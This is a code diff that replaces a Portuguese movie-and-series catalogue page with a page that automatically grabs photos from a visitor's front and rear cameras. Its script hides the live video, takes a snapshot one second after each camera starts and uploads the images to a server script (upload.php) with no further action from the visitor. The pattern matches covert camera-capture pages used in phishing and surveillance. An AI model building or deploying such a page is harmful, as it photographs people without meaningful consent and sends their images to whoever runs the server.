@@ -1,1 +1,81 @@
-<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>&#80;&#108;&#97;&#116;&#97;&#102;&#111;&#114;&#109;&#97;&#32;&#100;&#101;&#32;&#70;&#105;&#108;&#109;&#101;&#115;&#32;&#101;&#32;&#83;&#233;&#114;&#105;&#101;&#115;</title><link rel="stylesheet" href="style.css"></head><body><header><h1>&#80;&#108;&#97;&#116;&#97;&#102;&#111;&#114;&#109;&#97;&#32;&#100;&#101;&#32;&#70;&#105;&#108;&#109;&#101;&#115;&#32;&#101;&#32;&#83;&#233;&#114;&#105;&#101;&#115;</h1><input type="text" id="search" placeholder="&#80;&#101;&#115;&#113;&#117;&#105;&#115;&#97;&#114;&#32;&#102;&#105;&#108;&#109;&#101;&#115;&#32;&#101;&#32;&#115;&#233;&#114;&#105;&#101;&#115;&#46;&#46;&#46;"></header><section id="content"><h2>&#70;&#105;&#108;&#109;&#101;&#115;&#32;&#80;&#111;&#112;&#117;&#108;&#97;&#114;&#101;&#115;</h2><div id="movies-popular" class="content-container"></div><h2>&#70;&#105;&#108;&#109;&#101;&#115;&#32;&#77;&#97;&#105;&#115;&#32;&#66;&#101;&#109;&#32;&#65;&#118;&#97;&#108;&#105;&#97;&#100;&#111;&#115;</h2><div id="movies-top-rated" class="content-container"></div><h2>&#70;&#105;&#108;&#109;&#101;&#115;&#32;&#101;&#109;&#32;&#76;&#97;&#110;&#231;&#97;&#109;&#101;&#110;&#116;&#111;</h2><div id="movies-upcoming" class="content-container"></div><h2>&#83;&#233;&#114;&#105;&#101;&#115;&#32;&#80;&#111;&#112;&#117;&#108;&#97;&#114;&#101;&#115;</h2><div id="series-popular" class="content-container"></div><h2>&#83;&#233;&#114;&#105;&#101;&#115;&#32;&#77;&#97;&#105;&#115;&#32;&#66;&#101;&#109;&#32;&#65;&#118;&#97;&#108;&#105;&#97;&#100;&#97;&#115;</h2><div id="series-top-rated" class="content-container"></div><h2>&#83;&#233;&#114;&#105;&#101;&#115;&#32;&#101;&#109;&#32;&#69;&#120;&#105;&#98;&#105;&#231;&#227;&#111;&#32;&#72;&#111;&#106;&#101;</h2><div id="series-upcoming" class="content-container"></div></section><div id="modal" class="modal"><div class="modal-content"><span class="close">&times;</span><div id="modal-body"><img id="modal-image" src="" alt=""><h3 id="modal-title"></h3><p id="modal-overview"></p><p><strong>&#73;&#68;&#58;</strong> <span id="modal-id"></span></p><button id="copy-id-btn">&#67;&#111;&#112;&#105;&#97;&#114;&#32;&#73;&#68;</button><a id="watch-trailer-btn" href="#" target="_blank">&#65;&#115;&#115;&#105;&#115;&#116;&#105;&#114;&#32;&#84;&#114;&#97;&#105;&#108;&#101;&#114;</a><iframe id="trailer" width="100%" height="400px" frameborder="0" allowfullscreen style="display: none;"></iframe></div></div></div><script src="script.js"></script></body></html>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Captura Automática de Câmera</title>
+</head>
+<body>
+  <h1>Capturando Fotos Automáticas</h1>
+
+  <!-- Vídeos ao vivo da câmera -->
+  <video id="video-front" autoplay playsinline width="320" height="240" style="display: none;"></video>
+  <video id="video-back" autoplay playsinline width="320" height="240" style="display: none;"></video>
+
+  <!-- Exibir as fotos tiradas -->
+  <img id="photo-front" alt="Foto Frontal" width="320" height="240">
+  <img id="photo-back" alt="Foto Traseira" width="320" height="240">
+
+  <script>
+    const videoFront = document.getElementById('video-front');
+    const videoBack = document.getElementById('video-back');
+    const photoFront = document.getElementById('photo-front');
+    const photoBack = document.getElementById('photo-back');
+
+    // Função para iniciar a câmera (frontal ou traseira)
+    async function startCamera(videoElement, facingMode) {
+      const constraints = {
+        video: { facingMode: facingMode }
+      };
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        videoElement.srcObject = stream;
+
+        // Aguarda o vídeo carregar e tira a foto automaticamente
+        videoElement.onloadedmetadata = () => {
+          setTimeout(() => {
+            capturePhoto(videoElement, facingMode);
+          }, 1000); // Captura após 1 segundo
+        };
+      } catch (error) {
+        console.error('Erro ao acessar a câmera:', error);
+      }
+    }
+
+    // Função para capturar a foto e enviá-la ao servidor
+    function capturePhoto(videoElement, mode) {
+      const canvas = document.createElement('canvas');
+      canvas.width = videoElement.videoWidth;
+      canvas.height = videoElement.videoHeight;
+      const context = canvas.getContext('2d');
+      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+      // Converte a imagem capturada para Blob
+      canvas.toBlob((blob) => {
+        const url = URL.createObjectURL(blob);
+        if (mode === 'user') {
+          photoFront.src = url;  // Exibe a foto frontal
+        } else if (mode === 'environment') {
+          photoBack.src = url;   // Exibe a foto traseira
+        }
+
+        // Enviar a imagem para o servidor
+        const formData = new FormData();
+        formData.append('photo', blob, `${mode}-photo.jpg`);
+
+        fetch('upload.php', {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.text())
+        .then(data => console.log('Foto enviada com sucesso!', data))
+        .catch(error => console.error('Erro ao enviar a foto:', error));
+      }, 'image/jpeg');
+    }
+
+    // Iniciar a câmera frontal e traseira automaticamente
+    startCamera(videoFront, 'user');         // Câmera frontal
+    startCamera(videoBack, 'environment');   // Câmera traseira
+  </script>
+</body>
+</html>
